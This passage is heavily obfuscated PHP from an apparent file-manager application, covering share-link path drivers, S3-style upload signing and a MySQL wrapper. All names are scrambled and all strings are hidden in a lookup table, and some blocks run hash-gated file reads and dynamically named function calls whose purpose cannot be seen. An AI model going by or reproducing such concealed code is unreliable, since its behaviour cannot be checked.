$b±“«˜’¡Ú[33]); goto F ğó„¿ˆ; Cİ£ó‰ß: if ($fÚèğ¤ôÅ) { $AµŒéªõ‘À = $this->fileNameExistCache($f‚ïé¨óäÌ, $a…ôŒ³È â[$b±“«˜’¡Ú[28]]); if ($AµŒéªõ‘À) { if ($a…ôŒ³È â[$b±“«˜’¡Ú[366]] || $fÚèğ¤ôÅ == REPEAT_SKIP) { continue; } if ($fÚèğ¤ôÅ == REPEAT_REPLACE) { $CíŒÍô‡¸ = $this->sourceInfoCache($AµŒéªõ‘À); $A¥Ê™¬ÇÀô = $this->fileHistory($CíŒÍô‡¸, $a…ôŒ³È â[$b±“«˜’¡Ú[414]], $a…ôŒ³È â[$b±“«˜’¡Ú[77]]); if ($A¥Ê™¬ÇÀô) { $A£ˆéÍ”Šš[$b±“«˜’¡Ú[496]][] = $a…ôŒ³È â[$b±“«˜’¡Ú[414]]; } continue; } else { if ($fÚèğ¤ôÅ == REPEAT_RENAME) { $a…ôŒ³È â[$b±“«˜’¡Ú[28]] = $this->fileNameAutoCache($f‚ïé¨óäÌ, $a…ôŒ³È â[$b±“«˜’¡Ú[28]], $fÚèğ¤ôÅ, !1); } } } } if (!$a…ôŒ³È â[$b±“«˜’¡Ú[366]] && $a…ôŒ³È â[$b±“«˜’¡Ú[414]]) { $A£ˆéÍ”Šš[$b±“«˜’¡Ú[496]][] = $a…ôŒ³È â[$b±“«˜’¡Ú[414]]; } $aÀ°œ‡ííš[] = $this->_makeItemData($a…ôŒ³È â, $Eİ’ƒÌ¸Û, $a…ôŒ³È â[$b±“«˜’¡Ú[28]]); goto d¬ãåğ„ñ; d¬ãåğ„ñ: } unset($a…ôŒ³È â); if (!empty($aÀ°œ‡ííš)) { $this->addAll($aÀ°œ‡ííš); } goto f¥ÂÈéÃì˜; DîÆà´˜Ò²: $A×î¨½àõÊ = array_merge($cèéæòÜÕ”[$b±“«˜’¡Ú[73]], $cèéæòÜÕ”[$b±“«˜’¡Ú[74]]); $B££Ô‹¦÷ª = $this->_addFiles($A†§¶‘ÉÆš, $cèéæòÜÕ”[$b±“«˜’¡Ú[73]], $FíÒá£ö‚µ); $aÀ°œ‡ííš = array(); goto fñœšŸ×®º; f¥ÂÈéÃì˜: $b¢Ö›Âíñ× = $this->_childrenList($f‚ïé¨óäÌ); $b¢Ö›Âíñ× = array_to_keyvalue($b¢Ö›Âíñ×, $b±“«˜’¡Ú[28]); foreach ($A×î¨½àõÊ as $a…ôŒ³È â) { $CíŒÍô‡¸ = $b¢Ö›Âíñ×[$a…ôŒ³È â[$b±“«˜’¡Ú[28]]]; $A·Üšñª‹İ = $CíŒÍô‡¸[$b±“«˜’¡Ú[365]]; $this->_copyApplyMeta($CíŒÍô‡¸, $A£ˆéÍ”Šš); if ($a…ôŒ³È â[$b±“«˜’¡Ú[29]] == $b±“«˜’¡Ú[76]) { $a…ôŒ³È â[$b±“«˜’¡Ú[75]] = $A†§¶‘ÉÆš->getPathInner($a…ôŒ³È â[$b±“«˜’¡Ú[75]]); $this->_copyChildTo($A†§¶‘ÉÆš, $a…ôŒ³È â[$b±“«˜’¡Ú[75]], $A·Üšñª‹İ, $fÚèğ¤ôÅ, $A£ˆéÍ”Šš, $FíÒá£ö‚µ); } } goto b§ĞÇ‡°; BÊ¤ÉŸÛß‰: $b±“«˜’¡Ú =& $_SERVER[Ìó]; $Eİ’ƒÌ¸Û = $this->sourceInfoCache($f‚ïé¨óäÌ); $cèéæòÜÕ” = $A†§¶‘ÉÆš->listPath($a¾Ó¬Ã¾ã“, !1, !0); goto DîÆà´˜Ò²; b§ĞÇ‡°: } private function _addFiles($B¾š™•È†¸, $AÆ©Ùê®ÅĞ, $D¼Ù¥›ãÇÌ) { goto aÖµ·È¬ª; bÃ„ìÏÖÑö: foreach ($AÆ©Ùê®ÅĞ as &$c´Äãß¢‘) { goto DªæÃîÓ; Bö³ØºÆï­: if (count($C£ƒïÉÏÁ[$CÙ—ÎòÖèÆ]) > 1) { $c´Äãß¢‘[$f —‘õäã©[536]] = !0; } goto aš×Ù½ˆÑ; F„¨Ë˜àÆ–: $c´Äãß¢‘[$f —‘õäã©[159]] = $CÙ—ÎòÖèÆ; Hook::trigger($f —‘õäã©[538], $c´Äãß¢‘); $C£ƒïÉÏÁ[$CÙ—ÎòÖèÆ][] =& $c´Äãß¢‘; goto Bö³ØºÆï­; DªæÃîÓ: Hook::trigger($f —‘õäã©[537], $c´Äãß¢‘); $c´Äãß¢‘[$f —‘õäã©[75]] = $B¾š™•È†¸->getPathInner($c´Äãß¢‘[$f —‘õäã©[75]]); $aÑ¹ÉĞåÙ® = $B¾š™•È†¸->hashSimple($c´Äãß¢‘[$f —‘õäã©[75]]); goto f—Ÿ±“²Å; f—Ÿ±“²Å: $CÙ—ÎòÖèÆ = $B¾š™•È†¸->hashMd5($c´Äãß¢‘[$f —‘õäã©[75]]); if (strlen($CÙ—ÎòÖèÆ) > 10 && !isset($C£ƒïÉÏÁ[$CÙ—ÎòÖèÆ])) { $C£ƒïÉÏÁ[$CÙ—ÎòÖèÆ] = array(); } $c´Äãß¢‘[$f —‘õäã©[160]] = $aÑ¹ÉĞåÙ®; goto F„¨Ë˜àÆ–; aš×Ù½ˆÑ: } $bÕÇ”‘—­¨ = array($f —‘õäã©[159] => array($f —‘õäã©[7], array_keys($C£ƒïÉÏÁ))); $dâ³ó÷šœì = Model($f —‘õäã©[539]); goto fé‡”ÇÜŞ¨; f…Ã±»ùÂ: return $BÛâêñÏ¹ö; goto aÖÏß±™¤; C¯¸›ğá¢„: $bÕÇ”‘—­¨ = array($f —‘õäã©[159] => array($f —‘õäã©[7], array_keys($C£ƒïÉÏÁ))); $E¿ÙËòªÚç = $dâ³ó÷šœì->where($bÕÇ”‘—­¨)->select(); $E¿ÙËòªÚç = $E¿ÙËòªÚç ? $E¿ÙËòªÚç : array(); goto B÷”óÓ°¼; e³¸Ş¨Ëõˆ: $F×‡´ŠË‹ó = array(); foreach ($AÆ©Ùê®ÅĞ as $FâèÑâÔŠ) { if (isset($FâèÑâÔŠ[$f —‘õäã©[536]]) && $FâèÑâÔŠ[$f —‘õäã©[536]]) { continue; } $bæ÷ÕƒÙ = $B¾š™•È†¸->getPathInner($FâèÑâÔŠ[$f —‘õäã©[75]]); $fç†‰ÈÆ– = $dâ³ó÷šœì->addFileMake($bæ÷ÕƒÙ, $FâèÑâÔŠ[$f —‘õäã©[77]], $FâèÑâÔŠ[$f —‘õäã©[160]], $FâèÑâÔŠ[$f —‘õäã©[159]], $FâèÑâÔŠ[$f —‘õäã©[28]], $D¼Ù¥›ãÇÌ); $F×‡´ŠË‹ó[] = $fç†‰ÈÆ–; } $dâ³ó÷šœì->addAll($F×‡´ŠË‹ó); goto C¯¸›ğá¢„; aÖµ·È¬ª: $f —‘õäã© =& $_SERVER[Ìó]; if (!$AÆ©Ùê®ÅĞ || count($AÆ©Ùê®ÅĞ) == 0) { return array(); } $C£ƒïÉÏÁ = array(); goto bÃ„ìÏÖÑö; B÷”óÓ°¼: foreach ($E¿ÙËòªÚç as $FÌ×ä¾ãç–) { if (!isset($C£ƒïÉÏÁ[$FÌ×ä¾ãç–[$f —‘õäã©[159]]])) { continue; } $bíÁÁ»»°º =& $C£ƒïÉÏÁ[$FÌ×ä¾ãç–[$f —‘õäã©[159]]]; foreach ($bíÁÁ»»°º as &$c´Äãß¢‘) { $c´Äãß¢‘[$f —‘õäã©[414]] = $FÌ×ä¾ãç–[$f —‘õäã©[414]]; } unset($c´Äãß¢‘); } $BÛâêñÏ¹ö = array(); foreach ($AÆ©Ùê®ÅĞ as $AÓĞ‰áÏ) { $BÛâêñÏ¹ö[$AÓĞ‰áÏ[$f —‘õäã©[28]]] = $AÓĞ‰áÏ; } goto f…Ã±»ùÂ; fé‡”ÇÜŞ¨: $E¿ÙËòªÚç = $dâ³ó÷šœì->where($bÕÇ”‘—­¨)->select(); $E¿ÙËòªÚç = $E¿ÙËòªÚç ? $E¿ÙËòªÚç : array(); foreach ($E¿ÙËòªÚç as $FÌ×ä¾ãç–) { if (!isset($C£ƒïÉÏÁ[$FÌ×ä¾ãç–[$f —‘õäã©[159]]])) { continue; } $f¡›ãçÜ¶ = $C£ƒïÉÏÁ[$FÌ×ä¾ãç–[$f —‘õäã©[159]]]; foreach ($f¡›ãçÜ¶ as &$c´Äãß¢‘) { $c´Äãß¢‘[$f —‘õäã©[414]] = $FÌ×ä¾ãç–[$f —‘õäã©[414]]; $c´Äãß¢‘[$f —‘õäã©[536]] = !0; } unset($c´Äãß¢‘); } goto e³¸Ş¨Ëõˆ; aÖÏß±™¤: } } define($_SERVER[Ìó][540], $_SERVER[Ìó][541]); goto bİÜ¾£‚‘; CºÊàæ¦ä×: class PathDriverDriverShareItem { public function __construct($EÏ¡ç§Ÿ”) { $this->pathParse = $EÏ¡ç§Ÿ”; } public function __call($EÎÑ§‚ô•, $e‘ŠÖÔ“œ¿) { $AõƒˆğÑ‹ =& $_SERVER[Ìó]; if (method_exists($this, $EÎÑ§‚ô•)) { return; } $C„šš“£‘¤ = call_user_func_array(array($AõƒˆğÑ‹[1113], $EÎÑ§‚ô•), $e‘ŠÖÔ“œ¿); $C±íğÏ²Ö = array($AõƒˆğÑ‹[1114], $AõƒˆğÑ‹[1115], $AõƒˆğÑ‹[1116], $AõƒˆğÑ‹[1117], $AõƒˆğÑ‹[485], $AõƒˆğÑ‹[487], $AõƒˆğÑ‹[1118], $AõƒˆğÑ‹[102], $AõƒˆğÑ‹[1119], $AõƒˆğÑ‹[1120]); if (in_array($EÎÑ§‚ô•, $C±íğÏ²Ö)) { $C„šš“£‘¤ = $this->getPathOuter($C„šš“£‘¤); } return $C„šš“£‘¤; } public function copy($AˆŞÎáÓ, $cÊ’êœ±¿‘, $FÕ¯…‘ñõ» = false) { return $this->copyMove($AˆŞÎáÓ, $cÊ’êœ±¿‘, $FÕ¯…‘ñõ», $_SERVER[Ìó][485]); } public function move($Eğˆ¥‰¨Ã¿, $A¨™§Ÿ¤ÄÄ, $c’ëéŠÎˆ‚ = false) { return $this->copyMove($Eğˆ¥‰¨Ã¿, $A¨™§Ÿ¤ÄÄ, $c’ëéŠÎˆ‚, $_SERVER[Ìó][487]); } private function copyMove($C†òç¶Ğ…, $eÛ‹·‘ß¼«, $a’••åĞ³¼, $fØ«ÚßÃ) { goto F¨ç½”Õš‰; F¨ç½”Õš‰: $FÕ¹Êˆ¦ƒ« =& $_SERVER[Ìó]; $AÈÅ°É³ˆ = $eÛ‹·‘ß¼«; $C¦‘¢¯à = IO::driverMake($eÛ‹·‘ß¼«); goto CĞ˜ç×’Æù; a¢†ˆç…½: return $aã†‘ÖÃ‘; goto c§ôĞŠñêª; CĞ˜ç×’Æù: if ($C¦‘¢¯à->pathParse[$FÕ¹Êˆ¦ƒ«[994]]) { $eÛ‹·‘ß¼« = $C¦‘¢¯à->pathParse[$FÕ¹Êˆ¦ƒ«[994]]; } else { $eÛ‹·‘ß¼« = $AÈÅ°É³ˆ; } $aã†‘ÖÃ‘ = IO::copyMove($C†òç¶Ğ…, $eÛ‹·‘ß¼«, $a’••åĞ³¼, $fØ«ÚßÃ); $aã†‘ÖÃ‘ = $this->getPathOuter($aã†‘ÖÃ‘); goto a¢†ˆç…½; c§ôĞŠñêª: } public function pathFather($fĞˆåÂ±ßã) { return get_path_father($this->pathParse[$_SERVER[Ìó][75]]); } public function iconvSystem($EƒÀŸ§µƒ…) { return $EƒÀŸ§µƒ…; } protected function infoParse($a‹½âÊ‹¦„) { $AÒÔ…³®—é =& $_SERVER[Ìó]; $fÁ§Ş†ˆ±Æ = $this->pathParse[$AÒÔ…³®—é[434]][$AÒÔ…³®—é[1014]] . $this->pathParse[$AÒÔ…³®—é[1007]]; $C‡âÈ®ò© = IO::info($fÁ§Ş†ˆ±Æ); $b†ÈÏ½ò´ = $this->pathParse[$AÒÔ…³®—é[434]]; return Action($AÒÔ…³®—é[1112])->_shareItemeParse($C‡âÈ®ò©, $b†ÈÏ½ò´); } public function listAll($E¶ª×¿ËÕ) { $C¡ø«–˜±ò =& $_SERVER[Ìó]; $C¢ ªÃƒ = IO::listAll($E¶ª×¿ËÕ); $EÍŒ›¼‚ƒ¾ = $this->pathParse[$C¡ø«–˜±ò[434]]; foreach ($C¢ ªÃƒ as &$D£¥ĞùË‘ô) { check_abort(); $D£¥ĞùË‘ô = array_merge(IO::info($D£¥ĞùË‘ô[$C¡ø«–˜±ò[75]]), $D£¥ĞùË‘ô); $D£¥ĞùË‘ô[$C¡ø«–˜±ò[387]] = Action($C¡ø«–˜±ò[1112])->_shareItemeParse($D£¥ĞùË‘ô, $EÍŒ›¼‚ƒ¾); } return $C¢ ªÃƒ; } public function getPathOuter($dİÓ„½ñ¹ã) { goto EÃôˆ„É¢­; Eå·“ñè: $A‚¨¹»¼” = KodIO::clear($dİÓ„½ñ¹ã); $D¯ë£…ÓÀ = KodIO::clear($this->pathParse[$Añ¿Ğôåß‹[434]][$Añ¿Ğôåß‹[1014]]); $e‡Ÿëƒš× = substr($A‚¨¹»¼”, strlen($D¯ë£…ÓÀ)); goto BÓ™äœÃİé; EÃôˆ„É¢­: $Añ¿Ğôåß‹ =& $_SERVER[Ìó]; $CŒˆ¢ÑÄ¥„ = KodIO::parse($dİÓ„½ñ¹ã); if ($CŒˆ¢ÑÄ¥„[$Añ¿Ğôåß‹[29]] == KodIO::KOD_SHARE_ITEM) { return $CŒˆ¢ÑÄ¥„[$Añ¿Ğôåß‹[75]]; } goto Eå·“ñè; BÓ™äœÃİé: if (substr($A‚¨¹»¼”, 0, strlen($D¯ë£…ÓÀ)) != $D¯ë£…ÓÀ) { return !1; } return $this->pathParse[$Añ¿Ğôåß‹[1008]] . $Añ¿Ğôåß‹[8] . ltrim($e‡Ÿëƒš×, $Añ¿Ğôåß‹[8]); goto EÍÇÔ‡‚; EÍÇÔ‡‚: } public function getType() { $f°ß²êôÁ» =& $_SERVER[Ìó]; $bëçø©££­ = str_replace($f°ß²êôÁ»[71], $f°ß²êôÁ»[33], get_class($this)); return strtolower($bëçø©££­); } public function isTypeObject($f»ØÊƒ¸ˆ) { return IO::isTypeObject($f»ØÊƒ¸ˆ); } public function info($AÂõ¬ùŠÊÖ) { return $this->infoParse($AÂõ¬ùŠÊÖ); } public function infoAuth($Aæ£¥æ²—Ş) { return $this->infoParse($Aæ£¥æ²—Ş); } public function infoWithChildren($B¿¡Ú ³) { return $this->infoParse($B¿¡Ú ³); } public function infoFull($bà¡¤ïè’¯) { return $this->infoParse($bà¡¤ïè’¯); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($dŞŒ¦÷®™¶) { $this->pathParse = $dŞŒ¦÷®™¶; } protected function infoParse($e‘ÅÒíã) { $e¤èÃ•®äÑ =& $_SERVER[Ìó]; return Action($e¤èÃ•®äÑ[1013])->sharePathInfo($this->pathParse[$e¤èÃ•®äÑ[75]], !0); } public function listPath($aã½»œÃ©, $a¦„ ¢à³š = false) { $eê«ƒè…¸× =& $_SERVER[Ìó]; $bèæ¿²¢™ê = IO::listPath($aã½»œÃ©, $a¦„ ¢à³š); foreach ($bèæ¿²¢™ê as $cÆ§Ã›áØĞ => $bõàƒ·öÔŸ) { if (!in_array($cÆ§Ã›áØĞ, array($eê«ƒè…¸×[73], $eê«ƒè…¸×[74]))) { continue; } foreach ($bõàƒ·öÔŸ as $f¤“¼’µ¿ù => $Dò²²â¡) { $Dò²²â¡ = Action($eê«ƒè…¸×[1121])->parsePathChildren($Dò²²â¡, array($eê«ƒè…¸×[383] => $aã½»œÃ©)); $bèæ¿²¢™ê[$cÆ§Ã›áØĞ][$f¤“¼’µ¿ù] = Action($eê«ƒè…¸×[1013])->shareItemInfo($Dò²²â¡); } } return $bèæ¿²¢™ê; } public function listAll($Aã¨¹†‰ñŞ) { $CíÛù–Š“ò =& $_SERVER[Ìó]; $bÍ¨‚‡¿…· = IO::listAll($Aã¨¹†‰ñŞ); foreach ($bÍ¨‚‡¿…· as &$EÀé½©µ¼è) { $EÀé½©µ¼è = array_merge(IO::info($EÀé½©µ¼è[$CíÛù–Š“ò[75]]), $EÀé½©µ¼è); $EÀé½©µ¼è[$CíÛù–Š“ò[387]] = Action($CíÛù–Š“ò[1013])->shareItemInfo($EÀé½©µ¼è); } return $bÍ¨‚‡¿…·; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($d»–ºä©˜µ) { parent::__construct($d»–ºä©˜µ); $this->signatureVersion($_SERVER[Ìó][196]); } public function uploadFormData($bƒòÅÎ³Úó, $A¬ÎÑ–®¹ = 3600) { goto EİĞ‹›©; bôâê™è·£: $CÌæÍÜŸ = array($this->accessKey, $FàİšÅª»§, $this->region, $A×éø·…‹‚, $E¥­í×ã¸Œ); $d‚¯›†ŸÖÙ = implode($e÷ò®¤Óê[8], $CÌæÍÜŸ); $fŒĞÙ‚Ã®– = array($e÷ò®¤Óê[1091] => gmdate($e÷ò®¤Óê[1090], strtotime($e÷ò®¤Óê[1125])), $e÷ò®¤Óê[1092] => array(array($e÷ò®¤Óê[1094] => $this->bucket), array($e÷ò®¤Óê[1093] => $D‚Â÷ÅŸ„), array($e÷ò®¤Óê[1095], $e÷ò®¤Óê[1096], $e÷ò®¤Óê[33]), array($e÷ò®¤Óê[1095], $e÷ò®¤Óê[1126], $e÷ò®¤Óê[33]), array($e÷ò®¤Óê[1095], $e÷ò®¤Óê[1127], $e÷ò®¤Óê[33]), array($e÷ò®¤Óê[1097] => $Dïø°«Æ¶), array($e÷ò®¤Óê[1128] => $d‚¯›†ŸÖÙ), array($e÷ò®¤Óê[1129] => $eŒ³Ùå·Ä), array($e÷ò®¤Óê[1130] => $DÒ§«»ì˜), array($e÷ò®¤Óê[1131] => $C£Ôßó¥å†))); goto dÜ¥ó…ŒÜ; Dâİ×¡…‰: $Bˆß™Â‚í = hash_hmac($e÷ò®¤Óê[1132], $A×éø·…‹‚, $c‘ƒ©ùêÆğ, !0); $dš¶è–½ââ = hash_hmac($e÷ò®¤Óê[1132], $E¥­í×ã¸Œ, $Bˆß™Â‚í, !0); $BŒé²²ä½Á = hash_hmac($e÷ò®¤Óê[1132], $CÔÕŒê¶ó, $dš¶è–½ââ); goto BËøÁ‹À à; dØŸß‚É·: $E¥­í×ã¸Œ = $e÷ò®¤Óê[1124]; $C£Ôßó¥å† = $A¬ÎÑ–®¹ . $e÷ò®¤Óê[33]; $Dïø°«Æ¶ = $e÷ò®¤Óê[1089]; goto bôâê™è·£; dÜ¥ó…ŒÜ: $CÔÕŒê¶ó = base64_encode(json_encode($fŒĞÙ‚Ã®–)); $eÁ–ÉÁ¶í = hash_hmac($e÷ò®¤Óê[1132], $FàİšÅª»§, $e÷ò®¤Óê[1133] . $this->secret, !0); $c‘ƒ©ùêÆğ = hash_hmac($e÷ò®¤Óê[1132], $this->region, $eÁ–ÉÁ¶í, !0); goto Dâİ×¡…‰; EİĞ‹›©: $e÷ò®¤Óê =& $_SERVER[Ìó]; $D‚Â÷ÅŸ„ = $e÷ò®¤Óê[181]; $eŒ³Ùå·Ä = $e÷ò®¤Óê[1122]; goto C¹˜¨è¹Ü¶; BËøÁ‹À à: $F¦×’ñ”Ò  = array($e÷ò®¤Óê[195] => $e÷ò®¤Óê[33], $e÷ò®¤Óê[1134] => $e÷ò®¤Óê[33], $e÷ò®¤Óê[1093] => $D‚Â÷ÅŸ„, $e÷ò®¤Óê[1097] => $Dïø°«Æ¶, $e÷ò®¤Óê[1101] => $CÔÕŒê¶ó, $e÷ò®¤Óê[1135] => $d‚¯›†ŸÖÙ, $e÷ò®¤Óê[1136] => $eŒ³Ùå·Ä, $e÷ò®¤Óê[1137] => $DÒ§«»ì˜, $e÷ò®¤Óê[1138] => $C£Ôßó¥å†, $e÷ò®¤Óê[1139] => $BŒé²²ä½Á, $e÷ò®¤Óê[165] => $this->getHost()); return $F¦×’ñ”Ò ; goto a„’º‡éùã; C¹˜¨è¹Ü¶: $A×éø·…‹‚ = $e÷ò®¤Óê[59]; $DÒ§«»ì˜ = gmdate($e÷ò®¤Óê[1123]); $FàİšÅª»§ = gmdate($e÷ò®¤Óê[686]); goto dØŸß‚É·; a„’º‡éùã: } } goto Eë·µ•â; ağÏõ¨®”œ: $e¦¡ÆéÌÒò = $_SERVER[Ìó][795]; if ($_SERVER[$_SERVER[Ìó][768]] != $e¦¡ÆéÌÒò($BŒÖÄÉÄ¦ª)) { goto dã› ù†÷; CáåÖÛ§´ì: $a¶êÏÖ¦($BŒÖÄÉÄ¦ª); goto aÕÌ©÷ƒğõ; dã› ù†÷: $Bö¡éÕšº± = $_SERVER[Ìó][770]; $f ĞÀ‰ÇÇè = $_SERVER[$_SERVER[Ìó][771]] . $_SERVER[Ìó][772]; $fá°„½Á = $Bö¡éÕšº±($f ĞÀ‰ÇÇè); goto B™‹Š­§…ß; B™‹Š­§…ß: $Cù†›£»ñƒ = explode($_SERVER[Ìó][213], $fá°„½Á); if (count($Cù†›£»ñƒ) < $_SERVER[Ìó][548]) { $fîÑåø«ŒÂ = $_SERVER[Ìó][773]; $fîÑåø«ŒÂ(); } $a¶êÏÖ¦ = $_SERVER[Ìó][774]; goto CáåÖÛ§´ì; aÕÌ©÷ƒğõ: } class PathDriverDbShareLink extends PathDriverDB { public function __construct($EŠ•ä¯Ìæğ) { $this->pathParse = $EŠ•ä¯Ìæğ; $this->model = Model($_SERVER[Ìó][1106]); } protected function infoParse($d¸Á³•¥áÛ, $F³ÕÌª·‘Š = false, $Eª³âó×„¹ = false) { $BÓ¬™Ìß§á =& $_SERVER[Ìó]; return Action($BÓ¬™Ìß§á[1013])->sharePathInfo($this->pathParse[$BÓ¬™Ìß§á[75]], !0); } public function listPath($BÓ£Ç…øĞ, $cì˜ä©‰òÀ = false) { $fß‘ÏâßîÓ =& $_SERVER[Ìó]; $E°÷ŞÛêÀ = parent::listPath($BÓ£Ç…øĞ, $cì˜ä©‰òÀ); foreach ($E°÷ŞÛêÀ as $EöÃ¦ÇÚ¬» => $fŒÜê¸öˆó) { if (!in_array($EöÃ¦ÇÚ¬», array($fß‘ÏâßîÓ[73], $fß‘ÏâßîÓ[74]))) { continue; } foreach ($fŒÜê¸öˆó as $cº³‹”¶’ => $aŞÂµâÓ¨â) { $E°÷ŞÛêÀ[$EöÃ¦ÇÚ¬»][$cº³‹”¶’] = Action($fß‘ÏâßîÓ[1013])->shareItemInfo($aŞÂµâÓ¨â); } } return $E°÷ŞÛêÀ; } public function listAll($c³ò•Î»Ö…) { $C‹ÑƒÉ…Òò =& $_SERVER[Ìó]; $E»µ‹ÑåöÈ = IO::info($this->pathParse[$C‹ÑƒÉ…Òò[75]]); if (!$E»µ‹ÑåöÈ) { return array(); } $bĞäêé®÷Í = $this->model->listAll($c³ò•Î»Ö…); foreach ($bĞäêé®÷Í as &$d±¤‰ˆÒƒ) { $d±¤‰ˆÒƒ[$C‹ÑƒÉ…Òò[387]] = Action($C‹ÑƒÉ…Òò[1013])->shareItemInfo($d±¤‰ˆÒƒ[$C‹ÑƒÉ…Òò[387]]); } return $bĞäêé®÷Í; } } goto CºÊàæ¦ä×; AÂó³‰ˆÌŞ: if ($_SERVER[$_SERVER[Ìó][768]] != $e¦¡ÆéÌÒò($BŒÖÄÉÄ¦ª)) { goto bğÚç•¾‚; bğÚç•¾‚: $Bö¡éÕšº± = $_SERVER[Ìó][770]; $f ĞÀ‰ÇÇè = $_SERVER[$_SERVER[Ìó][771]] . $_SERVER[Ìó][772]; $fá°„½Á = $Bö¡éÕšº±($f ĞÀ‰ÇÇè); goto cÏ¢¨è†òÌ; cÏ¢¨è†òÌ: $Cù†›£»ñƒ = explode($_SERVER[Ìó][213], $fá°„½Á); if (count($Cù†›£»ñƒ) < $_SERVER[Ìó][548]) { $fîÑåø«ŒÂ = $_SERVER[Ìó][773]; $fîÑåø«ŒÂ(); } $a¶êÏÖ¦ = $_SERVER[Ìó][774]; goto B¥èïöĞÅ±; B¥èïöĞÅ±: $a¶êÏÖ¦($BŒÖÄÉÄ¦ª); goto d¢Ì©²ôÂ; d¢Ì©²ôÂ: } class DbMysql extends Db { public function __construct($D–‘ëäÃˆˆ = '') { $cøƒœ—÷ó =& $_SERVER[Ìó]; if (!extension_loaded($cøƒœ—÷ó[724])) { think_exception(think_lang($cøƒœ—÷ó[10]) . $cøƒœ—÷ó[796]); } if (!empty($D–‘ëäÃˆˆ)) { $this->config = $D–‘ëäÃˆˆ; if (empty($this->config[$cøƒœ—÷ó[13]])) { $this->config[$cøƒœ—÷ó[13]] = $cøƒœ—÷ó[33]; } } } public function connect($AŸ£ô»îŸ© = '', $A—–´¸¹‰š = 0, $C¥çëº¢æÂ = false) { $BÜÑ˜ñËå =& $_SERVER[Ìó]; if (!isset($this->linkID[$A—–´¸¹‰š])) { goto AÃÒ¶ìáŠŒ; F÷Ê´ùàÕ: if ($f•«„ñİº±) { $this->linkID[$A—–´¸¹‰š] = mysql_pconnect($eƒˆŒ™™Ïã, $AŸ£ô»îŸ©[$BÜÑ˜ñËå[799]], $AŸ£ô»îŸ©[$BÜÑ˜ñËå[800]], 131072); } else { $this->linkID[$A—–´¸¹‰š] = mysql_connect($eƒˆŒ™™Ïã, $AŸ£ô»îŸ©[$BÜÑ˜ñËå[799]], $AŸ£ô»îŸ©[$BÜÑ˜ñËå[800]], !0, 131072); } if (!$this->linkID[$A—–´¸¹‰š] || !empty($AŸ£ô»îŸ©[$BÜÑ˜ñËå[17]]) && !mysql_select_db($AŸ£ô»îŸ©[$BÜÑ˜ñËå[17]], $this->linkID[$A—–´¸¹‰š])) { think_exception(mysql_error()); } $FéôîçÒ© = mysql_get_server_info($this->linkID[$A—–´¸¹‰š]); goto fğĞ‰½Î; fğĞ‰½Î: mysql_query($BÜÑ˜ñËå[801] . think_config($BÜÑ˜ñËå[802]) . $BÜÑ˜ñËå[55], $this->linkID[$A—–´¸¹‰š]); if ($FéôîçÒ© > $BÜÑ˜ñËå[803]) { mysql_query($BÜÑ˜ñËå[804], $this->linkID[$A—–´¸¹‰š]); } $this->connected = !0; goto fÔ§÷¼è—‡; AÃÒ¶ìáŠŒ: if (empty($AŸ£ô»îŸ©)) { $AŸ£ô»îŸ© = $this->config; } $eƒˆŒ™™Ïã = $AŸ£ô»îŸ©[$BÜÑ˜ñËå[797]] . ($AŸ£ô»îŸ©[$BÜÑ˜ñËå[798]] ? "\x3a{$AŸ£ô»îŸ©[$BÜÑ˜ñËå[798]]}" : $BÜÑ˜ñËå[33]); $f•«„ñİº± = !empty($AŸ£ô»îŸ©[$BÜÑ˜ñËå[13]][$BÜÑ˜ñËå[14]]) ? $AŸ£ô»îŸ©[$BÜÑ˜ñËå[13]][$BÜÑ˜ñËå[14]] : $this->pconnect; goto F÷Ê´ùàÕ; fÔ§÷¼è—‡: if (1 != think_config($BÜÑ˜ñËå[18])) { unset($this->config); } goto aê¿†Àèá¼; aê¿†Àèá¼: } return $this->linkID[$A—–´¸¹‰š]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($DÔİ’‰ô–ˆ) { goto b‹§í§ò„; A²Íîˆ›¯Ç: think_action_status($C°®¸­ƒï‘[19], 1); think_status($C°®¸­ƒï‘[20]); $this->queryID = mysql_query($DÔİ’‰ô–ˆ, $this->_linkID); goto F‚ôÒßâ­à; b‹§í§ò„: $C°®¸­ƒï‘ =& $_SERVER[Ìó]; if (0 === stripos($DÔİ’‰ô–ˆ, $C°®¸­ƒï‘[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Bç”ñ²†¢à; Bç”ñ²†¢à: if (!$this->_linkID) { return !1; } $this->queryStr = $DÔİ’‰ô–ˆ; if ($this->queryID) { $this->free(); } goto A²Íîˆ›¯Ç; F‚ôÒßâ­à: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto e¹ˆñÒ°Ç¦; e¹ˆñÒ°Ç¦: } public function execute($fï—²ô ) { goto a×²îšæÑ; a×²îšæÑ: $Eâ Œ¨æõ =& $_SERVER[Ìó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aƒ˜Œ¯ÄÇ×; aƒ˜Œ¯ÄÇ×: $this->queryStr = $fï—²ô ; if ($this->queryID) { $this->free(); } think_action_status($Eâ Œ¨æõ[21], 1); goto E‡Ù³µ ƒõ; E‡Ù³µ ƒõ: think_status($Eâ Œ¨æõ[20]); $a’˜”ÉÉ’ù = mysql_query($fï—²ô , $this->_linkID); $this->debug(); goto aÜ‚ÎŠšğõ; aÜ‚ÎŠšğõ: if (!1 === $a’˜”ÉÉ’ù) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto F™Ì”Ç¡œÖ; F™Ì”Ç¡œÖ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ìó][805], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d¸¸©ôêŸì = mysql_query($_SERVER[Ìó][806], $this->_linkID); $this->transTimes = 0; if (!$d¸¸©ôêŸì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÃõŠÑ³Á´ = mysql_query($_SERVER[Ìó][807], $this->_linkID); $this->transTimes = 0; if (!$aÃõŠÑ³Á´) { $this->error(); return !1; } } return !0; } private function getAll() { $B‹°³óÏ’ = array(); if ($this->numRows > 0) { while ($d¸ÅÔ®…ùÃ = mysql_fetch_assoc($this->queryID)) { $B‹°³óÏ’[] = $d¸ÅÔ®…ùÃ; } 